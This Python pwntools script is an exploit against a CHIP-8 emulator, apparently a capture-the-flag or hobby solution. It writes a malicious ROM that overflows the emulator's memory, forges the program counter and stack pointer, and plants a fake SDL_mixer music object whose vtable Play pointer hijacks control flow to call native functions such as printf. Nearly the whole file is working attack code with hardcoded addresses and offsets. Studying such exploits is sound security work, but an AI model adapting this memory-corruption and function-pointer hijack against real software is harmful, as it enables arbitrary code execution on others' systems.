import pwn

# pwndbg> ptype /o struct Chip8
#/* offset      |    size */  type = struct Chip8 {
#/*      0      |    4096 */    uint8_t memory[4096];
#/*   4096      |    2048 */    uint8_t display[2048];
#/*   6144      |       2 */    uint16_t pc;
#/*   6146      |       2 */    uint16_t index;
#/*   6148      |      32 */    uint16_t stack[16];
#/*   6180      |       1 */    uint8_t stack_pointer;
#/*   6181      |       1 */    uint8_t delay;
#/*   6182      |       1 */    uint8_t sound;
#/*   6183      |      16 */    uint8_t registers[16];
#/* XXX  1-byte hole      */
#/*   6200      |       2 */    uint16_t op_code;
#/*   6202      |       1 */    uint8_t draw_flag;
#/*   6203      |       1 */    uint8_t draw_wait;
#/*   6204      |      16 */    uint8_t input[16];
#
#                               /* total size (bytes): 6220 */
#                             }


ROM_START_OFFSET   = 0x200

# chip struct offsets from rom start
PC_OFFSET          = 6144 - 0x200
SP_OFFSET          = 6180 - 0x200
CHIP_STRUCT_SIZE   = 6220

MUSIC_ADDR         = 0x406990
CHIP_ADDR          = 0x405120
BUFFER_START_ADDR  = CHIP_ADDR + ROM_START_OFFSET
MEMORY_END_ADDR    = CHIP_ADDR + 0x1000
STACK_ADDR         = CHIP_ADDR + 6148

# offset of music from chip.stack
MUSIC_OFFSET       = MUSIC_ADDR - STACK_ADDR 
SP_VALUE           = int(MUSIC_OFFSET / 2)

PRINTF_PLT         = 0x401080

    #struct Mix_Music {
    #    Mix_MusicInterface *interface;
    #    void *context;
    #
    #    bool playing;
    #    Mix_Fading fading;
    #    int fade_step;
    #    int fade_steps;
    #
    #    char filename[1024];
    #};

    #sizeof(struct Mix_Music) = 1056
    #sizeof(struct Mix_Music) - filename = 32
    #sizeof(Mix_MusicInterface) = 224
    #offsetof(Mix_MusicInterface, SetVolume) = 56
    #offsetof(Mix_MusicInterface, Play) = 72
    #offsetof(Mix_MusicInterface, Seek) = 104
    #offsetof(Mix_MusicInterface, Stop) = 192

FAKE_MUSIC_ADDR    = 0x406a5e
INTERFACE_ADDR     = MEMORY_END_ADDR - 224
PLAY_ADDR          = INTERFACE_ADDR + 72
PLAY_CHIP_ADDR     = PLAY_ADDR - CHIP_ADDR


def pad(b, n, padding=b"A"):
    return (b + n * padding)[:n]

def read_file(filename: str):
    with open(filename, "rb") as f:
        return f.read()

class Asm:
    def __init__(self):
        self.instructions = 0
        self.pc = 0x200
        self.code = b""

    def _validate_addr(self, addr: int):
        if not addr & 0xfff == addr:
            print(addr)
            assert False

    def _validate_x(self, x: int):
        assert x & 0xf == x

    def _validate_nn(self, nn: int):
        assert nn & 0xff == nn

    def _increment_pc(self):
        self.pc += 2
        self.instructions = (self.instructions + 1) % 11

    def _pack_opcode(self, opcode):
        return pwn.pack(opcode, word_size=16, endianness="big")

    def jump(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0x1000 | addr)

    def call(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0x2000 | addr)

    def set_index(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0xa000 | addr)

    def store_vx(self, x: int):
        self._validate_x(x)
        self._increment_pc()
        self.code += self._pack_opcode(0xf055 | (x << 8))

    def load_vx_imm(self, x: int, imm: int):
        self._validate_x(x)
        self._validate_nn(imm)
        self._increment_pc()
        self.code += self._pack_opcode(0x6000 | (x << 8) | imm)

    def clear_screen(self):
        self._increment_pc()
        self.code += self._pack_opcode(0x00e0)

    def set_sound(self, x: int):
        self._validate_x(x)
        self._increment_pc()
        self.code += self._pack_opcode(0xf018 | (x << 8))

    def nop(self):
        self.jump(self.pc+2)

    def seek_pc(self, seeked_pc):
        self._validate_addr(seeked_pc)
        assert seeked_pc > self.pc
        assert seeked_pc % 2 == 0
        for _ in range(int((seeked_pc-self.pc)/2)):
            self.nop()
        self.pc = seeked_pc

    def label(self):
        return self.pc

    def write_qword_le(self, addr: int, qword: int):
        self.set_index(addr)
        for i in range(8):
            self.load_vx_imm(i, (qword >> (8 * i)) & 0xFF)
        self.store_vx(7)

    def write_bytes(self, addr: int, b: bytes):
        self.set_index(addr)
        for byte in b:
            self.load_vx_imm(0, byte)
            self.store_vx(0)

    def native_call_primitive(self, address: int):
        self.write_qword_le(PLAY_CHIP_ADDR, address)
        self.load_vx_imm(0, 1)
        self.set_sound(0)
        while self.instructions != 0:
            self.nop()

    def assemble(self):
        return self.code

def exploit():
    pwn.info(f"Placing fake music interface object at address {hex(INTERFACE_ADDR)} (chip8 addr {hex(INTERFACE_ADDR - CHIP_ADDR)})")
    pwn.info(f"Execution starts at pc = {hex(((FAKE_MUSIC_ADDR & 0xffff) - 2) & 0xfff)}")

    asm = Asm()

    _start = asm.label()
    asm.load_vx_imm(0, 0x22)
    asm.load_vx_imm(1, 0x22)
    asm.set_index(0x40-2)
    asm.store_vx(1)
    asm.jump(0x40-2)

    asm.seek_pc(0x222)
    # at this point the machine is 'booted': profit

    asm.write_bytes(0x0, b"hello from the chip8!\n\0")
    asm.native_call_primitive(PRINTF_PLT)

    # more booting code
    asm.seek_pc(((FAKE_MUSIC_ADDR & 0xffff) - 2) & 0xfff)
    asm.call(_start)

    code = asm.assemble()

    forged_chip_struct = pad(code, PC_OFFSET, padding=b"\x00")
    forged_chip_struct += pwn.p16((FAKE_MUSIC_ADDR & 0xffff) - 2) # forged pc
    forged_chip_struct += b"\x00" * (SP_OFFSET - PC_OFFSET - 2)
    forged_chip_struct += pwn.p8(SP_VALUE) # forged sp
    forged_chip_struct = pad(forged_chip_struct, CHIP_STRUCT_SIZE - ROM_START_OFFSET, padding=b"\x00")


    # interface
    forged_music_struct = pwn.p64(INTERFACE_ADDR) # put the interface into chip8's memory
    # context
    forged_music_struct += pwn.p64(CHIP_ADDR) # point context into the start of chip8's memory
    # just pad the rest of the values with zeros
    forged_music_struct = pad(forged_music_struct, 1056, padding=b"\x00")

    forged_music_interface_struct = b"\x00" * 72
    forged_music_interface_struct += pwn.p64(0x0000000000401016)
    forged_music_interface_struct = pad(forged_music_interface_struct, 224, padding=b"\x00")

    rom = forged_chip_struct
    rom += b"\x00" * (FAKE_MUSIC_ADDR - (CHIP_ADDR + ROM_START_OFFSET + len(forged_chip_struct)))
    rom += forged_music_struct

    with open("exploit", "wb") as f:
        f.write(rom)


if __name__ == "__main__":
    exploit()